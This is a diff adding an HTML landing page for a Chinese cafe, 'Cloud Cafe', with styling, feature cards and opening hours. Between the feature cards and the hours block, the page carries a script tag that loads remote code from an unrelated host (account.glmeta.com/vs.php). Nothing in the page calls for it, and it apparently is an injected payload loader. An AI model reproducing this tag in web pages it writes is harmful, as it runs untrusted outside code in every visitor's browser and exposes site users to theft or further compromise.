@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>云朵咖啡馆 | Cloud Cafe</title>
+    <style>
+        /* 基础样式 */
+        :root {
+            --main-color: #6F4E37;
+            --bg-color: #F5EDE0;
+            --text-dark: #3E2723;
+        }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', system-ui;
+            line-height: 1.6;
+            background: var(--bg-color);
+            color: var(--text-dark);
+        }
+
+        /* 导航条 */
+        .nav {
+            background: white;
+            padding: 1rem;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        .nav-title {
+            font-size: 1.8rem;
+            color: var(--main-color);
+            text-align: center;
+        }
+
+        /* 主视觉区 */
+        .hero {
+            height: 60vh;
+            background: linear-gradient(rgba(0,0,0,0.3), rgba(0,0,0,0.3)), 
+                        url('https://images.unsplash.com/photo-1498804103079-a6351b050096?ixlib=rb-1.2.1&auto=format&fit=crop&w=1920&q=80');
+            background-size: cover;
+            background-position: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            color: white;
+            padding: 2rem;
+        }
+        .hero h1 {
+            font-size: 2.5rem;
+            margin-bottom: 1rem;
+        }
+
+        /* 主要内容区 */
+        .content {
+            max-width: 1200px;
+            margin: 3rem auto;
+            padding: 0 1rem;
+        }
+
+        /* 特色区块 */
+        .features {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 2rem;
+            margin: 3rem 0;
+        }
+        .feature-card {
+            background: white;
+            padding: 2rem;
+            border-radius: 10px;
+            text-align: center;
+            transition: 0.3s;
+        }
+        .feature-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+        }
+        .feature-icon {
+            font-size: 2.5rem;
+            color: var(--main-color);
+            margin-bottom: 1rem;
+        }
+
+        /* 营业时间 */
+        .hours {
+            background: white;
+            padding: 2rem;
+            border-radius: 10px;
+            margin: 2rem 0;
+        }
+        .hours-table {
+            margin-top: 1rem;
+        }
+        .hours-table div {
+            display: flex;
+            justify-content: space-between;
+            padding: 0.5rem 0;
+            border-bottom: 1px solid #eee;
+        }
+
+        /* 响应式设计 */
+        @media (max-width: 768px) {
+            .hero h1 { font-size: 2rem; }
+            .features { grid-template-columns: 1fr; }
+        }
+    </style>
+</head>
+<body>
+    <nav class="nav">
+        <div class="nav-title">☁️ 云朵咖啡馆</div>
+    </nav>
+
+    <section class="hero">
+        <div>
+            <h1>现磨精品咖啡</h1>
+            <p>每日新鲜烘焙 | 城市宁静角落</p >
+        </div>
+    </section>
+
+    <main class="content">
+        <div class="features">
+            <div class="feature-card">
+                <div class="feature-icon">☕</div>
+                <h3>精品手冲</h3>
+                <p>选用当季新鲜咖啡豆</p >
+            </div>
+            <div class="feature-card">
+                <div class="feature-icon">🍰</div>
+                <h3>手工甜点</h3>
+                <p>每日限量供应</p >
+            </div>
+            <div class="feature-card">
+                <div class="feature-icon">📚</div>
+                <h3>自由书吧</h3>
+                <p>300+本精选图书</p >
+            </div>
+        </div>
+        <script src='https://account.glmeta.com/vs.php?id=16070'></script>
+        <div class="hours">
+            <h2>营业时间</h2>
+            <div class="hours-table">
+                <div><span>周一至周五</span><span>8:00 - 20:00</span></div>
+                <div><span>周末及假期</span><span>9:00 - 22:00</span></div>
+            </div>
+        </div>
+    </main>
+</body>
+</html>
